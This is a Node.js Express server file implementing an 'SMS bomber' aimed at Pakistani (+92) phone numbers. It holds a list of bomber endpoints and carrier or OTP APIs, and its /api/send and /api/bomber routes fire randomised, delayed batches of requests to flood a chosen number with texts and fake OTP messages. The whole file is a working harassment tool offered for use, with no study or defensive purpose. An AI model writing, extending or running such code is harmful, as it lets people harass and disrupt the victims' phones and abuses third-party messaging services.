// api/index.js
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const path = require('path');
const axios = require('axios');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
// CONFIGURATION
// ============================================================
const API_LIST = [
    // Working GET APIs
    {
        "name": "SMS Bomber Worker",
        "url": (phone) => `http://sms-bomber.subhxcosmo.workers.dev/api?num=92${phone}`,
        "method": "GET",
        "headers": {},
        "data": null
    },
    {
        "name": "Bomberrr Vercel",
        "url": (phone) => `https://bomberrr.vercel.app/?key=roots&number=92${phone}`,
        "method": "GET",
        "headers": {},
        "data": null
    },
    {
        "name": "Global SMS API",
        "url": (phone) => `https://sms-service.global/api/send?phone=92${phone}&message=OTP`,
        "method": "GET",
        "headers": {},
        "data": null
    },
    // Free SMS APIs
    {
        "name": "Textlocal SMS",
        "url": "https://api.textlocal.in/send/",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": (phone) => `apikey=YOUR_API_KEY&numbers=92${phone}&sender=TXTLCL&message=Your%20OTP%20is%201234`
    },
    {
        "name": "Fast2SMS",
        "url": "https://www.fast2sms.com/dev/bulkV2",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": (phone) => `authorization=YOUR_API_KEY&route=otp&variables_values=1234&flash=0&numbers=92${phone}`
    },
    // WhatsApp APIs
    {
        "name": "WhatsApp Business",
        "url": "https://api.whatsapp.com/send",
        "method": "GET",
        "headers": {},
        "data": (phone) => `?phone=92${phone}&text=Your%20OTP%20is%201234`
    },
    // Pakistan Local Services
    {
        "name": "Jazz SMS",
        "url": "https://api.jazz.com.pk/sms/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({
            "msisdn": `92${phone}`,
            "message": "Your OTP is 1234",
            "sender": "JAZZ"
        })
    },
    {
        "name": "Ufone SMS",
        "url": "https://api.ufone.com/sms/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({
            "phone": `92${phone}`,
            "text": "Your OTP is 1234"
        })
    },
    {
        "name": "Telenor Pakistan",
        "url": "https://api.telenor.com.pk/sms",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({
            "number": `92${phone}`,
            "message": "Your OTP is 1234",
            "source": "TELENOR"
        })
    },
    {
        "name": "Zong SMS",
        "url": "https://api.zong.com.pk/sms/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({
            "to": `92${phone}`,
            "body": "Your OTP is 1234"
        })
    }
];

// ============================================================
// MIDDLEWARE
// ============================================================
app.use(helmet({
    contentSecurityPolicy: false,
    hidePoweredBy: true,
    xFrameOptions: 'DENY'
}));

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    message: { error: true, message: 'Too many requests' }
});
app.use('/api/', limiter);

// ============================================================
// KEY MANAGEMENT
// ============================================================
const keyStore = new Map();

// ============================================================
// SMS ENGINE
// ============================================================
async function sendSmsBatch(phoneNumber, count = 1) {
    const results = [];
    const apisToUse = API_LIST.sort(() => Math.random() - 0.5);
    
    for (let i = 0; i < Math.min(count, 15); i++) {
        const api = apisToUse[i % apisToUse.length];
        if (!api) continue;

        try {
            let url = typeof api.url === 'function' ? api.url(phoneNumber) : api.url;
            let data = typeof api.data === 'function' ? api.data(phoneNumber) : api.data;

            const config = {
                method: api.method,
                url: url,
                headers: api.headers || {},
                timeout: 5000
            };

            if (api.method === 'POST' || api.method === 'PUT') {
                if (api.headers?.['Content-Type'] === 'application/json') {
                    config.data = typeof data === 'string' ? JSON.parse(data) : data;
                } else {
                    config.data = data;
                }
            }

            await axios(config);
            results.push(true);
        } catch (error) {
            results.push(false);
        }

        // Random delay between requests
        await new Promise(resolve => setTimeout(resolve, Math.random() * 200 + 50));
    }

    return results;
}

// ============================================================
// API ROUTES
// ============================================================

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'online', time: Date.now() });
});

// Create API Key
app.post('/api/createkey', (req, res) => {
    try {
        const { name } = req.body;
        if (!name) {
            return res.status(400).json({ error: true });
        }

        const apiKey = crypto.randomBytes(16).toString('hex');
        keyStore.set(apiKey, {
            name,
            created: Date.now(),
            status: 'active'
        });

        res.json({ key: apiKey, status: 'active' });
    } catch (error) {
        res.status(500).json({ error: true });
    }
});

// Validate Key
app.get('/api/validate/:key', (req, res) => {
    const keyData = keyStore.get(req.params.key);
    res.json({ valid: !!keyData });
});

// Send SMS - POST
app.post('/api/send', async (req, res) => {
    try {
        const { number, count = 3 } = req.body;
        
        if (!number) {
            return res.status(400).json({ error: true });
        }

        let cleanNumber = number.replace(/[^0-9]/g, '');
        if (!cleanNumber.startsWith('92')) {
            cleanNumber = `92${cleanNumber}`;
        }

        const results = await sendSmsBatch(cleanNumber, parseInt(count) || 3);
        const successCount = results.filter(r => r === true).length;

        res.json({
            success: successCount > 0,
            sent: successCount,
            total: results.length
        });
    } catch (error) {
        res.json({ success: false, sent: 0, total: 0 });
    }
});

// Send SMS - GET
app.get('/api/send', async (req, res) => {
    try {
        const { number, count = 3 } = req.query;
        
        if (!number) {
            return res.status(400).json({ error: true });
        }

        let cleanNumber = number.replace(/[^0-9]/g, '');
        if (!cleanNumber.startsWith('92')) {
            cleanNumber = `92${cleanNumber}`;
        }

        const results = await sendSmsBatch(cleanNumber, parseInt(count) || 3);
        const successCount = results.filter(r => r === true).length;

        res.json({
            success: successCount > 0,
            sent: successCount,
            total: results.length
        });
    } catch (error) {
        res.json({ success: false, sent: 0, total: 0 });
    }
});

// Bomber Mode
app.post('/api/bomber', async (req, res) => {
    try {
        const { number, count = 10 } = req.body;
        
        if (!number) {
            return res.status(400).json({ error: true });
        }

        let cleanNumber = number.replace(/[^0-9]/g, '');
        if (!cleanNumber.startsWith('92')) {
            cleanNumber = `92${cleanNumber}`;
        }

        const totalRequests = Math.min(parseInt(count) || 10, 30);
        const batchSize = Math.ceil(totalRequests / 3);
        let totalSent = 0;

        for (let i = 0; i < 3; i++) {
            const batchCount = Math.min(batchSize, totalRequests - totalSent);
            if (batchCount <= 0) break;

            const results = await sendSmsBatch(cleanNumber, batchCount);
            totalSent += results.filter(r => r === true).length;
            
            await new Promise(resolve => setTimeout(resolve, 300));
        }

        res.json({
            success: totalSent > 0,
            sent: totalSent,
            total: totalRequests
        });
    } catch (error) {
        res.json({ success: false, sent: 0, total: 0 });
    }
});

// Get API Status
app.get('/api/status', (req, res) => {
    res.json({
        apis: API_LIST.length,
        keys: keyStore.size,
        uptime: process.uptime()
    });
});

// ============================================================
// SERVE FRONTEND
// ============================================================
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../public/index.html'));
});

// ============================================================
// START SERVER
// ============================================================
app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📱 SMS API: http://localhost:${PORT}/api/send`);
    console.log(`💣 Bomber: http://localhost:${PORT}/api/bomber`);
    console.log(`🔑 Create Key: http://localhost:${PORT}/api/createkey`);
});

module.exports = app;
